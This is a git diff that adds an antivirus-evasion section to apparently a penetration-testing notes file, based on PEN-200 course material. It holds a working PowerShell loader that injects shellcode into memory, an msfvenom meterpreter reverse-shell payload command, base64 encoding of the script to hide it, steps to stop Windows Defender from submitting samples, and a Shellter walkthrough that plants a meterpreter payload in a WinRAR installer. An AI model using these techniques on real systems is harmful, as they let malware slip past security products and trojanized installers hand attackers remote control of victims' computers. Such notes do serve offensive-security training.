@@ -174,6 +174,10 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Token Impersonation](#token-impersonation)
     - [getsystem](#getsystem)
   - [Buffer Overflow](#buffer-overflow)
+  - [Antivirus Evasion](#antivirus-evasion)
+    - [ToDo](#todo)
+    - [Thread Injection](#thread-injection)
+    - [Shellter](#shellter)
 - [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
   - [Prompt Injection](#prompt-injection)
 
@@ -4201,6 +4205,78 @@ On Immunity, using mona, type
    - `shellcode` also contains `"\x90" * 32`. Those are NOPs, some padding to make sure that our code gets executed.
 3. Use the command `nc -nvlp 4444`
 4. Run the script, notice the shell in netcat
+
+
+## Antivirus Evasion
+
+### <ins>ToDo</ins>
+- Discover the AV in the machine of the victim
+- Create a VM that resembles the victim's machine
+- Make sure to disable sample submission 
+  - `Windows Security` > `Virus & threat protection` > `Manage Settings` > `Automatic Sample Submission`
+- As last resort, check the malware created with
+  - [VirusTotal](https://www.virustotal.com/)
+  - [AntiScan.Me](https://antiscan.me/)
+
+### <ins>Thread Injection</ins>
+
+1. Write this In-memory payload injection PowerShell `.ps1` script, from [PEN-200](https://www.offsec.com/courses/pen-200/)
+   ```PowerShell
+   <# Importing Windows APIs in PowerShell #>
+   $code = '
+   [DllImport("kernel32.dll")]
+   public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+   [DllImport("kernel32.dll")]
+   public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+   [DllImport("msvcrt.dll")]
+   public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+  
+   <# Memory allocation and payload writing using Windows APIs in PowerShell #>
+   $var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
+   [Byte[]];
+   [Byte[]] $var1 = <SHELLCODE-HERE>;
+   $size = 0x1000;
+   if ($var1.Length -gt 0x1000) {$size =  $var1.Length};
+   $x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
+   for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
+   
+   <# Calling the payload using CreateThread #>
+   $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+   ```
+  
+2. Generate a PowerShell compatible payload
+   - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f powershell`
+3. Insert the result in `[Byte[]] $var1` in the PowerShell Script
+4. Change the ExecutionPolicy for current user
+   ```PowerShell
+   PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+   PS C:\> Get-ExecutionPolicy -Scope CurrentUser
+   ```
+5. Set up a handler to interact with the meterpreter shell
+     ```PowerShell
+     msf exploit(multi/handler) > show options   <# Set the correct values #>
+     msf exploit(multi/handler) > exploit
+     ```
+6. Run the PowerShell script
+   - You can also decide to convert the script in base64 with [ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py) and run it with `powershell.exe -e <BASE64>`
+8. Get the meterpreter shell on the attacking machine
+
+### <ins>Shellter</ins>
+
+Example of usage
+1. Select Auto mode with `A`
+2. Selecting a target PE in shellter and performing a backup, in this case the WinRAR installer: `/home/kali/Desktop/winrar-x32-621.exe`
+3. Enable stealth mode with `Y`
+4. Select a listed payload with `L`
+5. Select `meterpreter_reverse_tcp` with `1`
+6. Set `LHOST` and `LPORT`
+7. Create a listener in Kali with Metasploit
+   ```
+   msf exploit(multi/handler) > show options
+   msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
+   msf exploit(multi/handler) > exploit
+   ```
+8. Get the meterpreter shell on the attacking machine
 
 
 
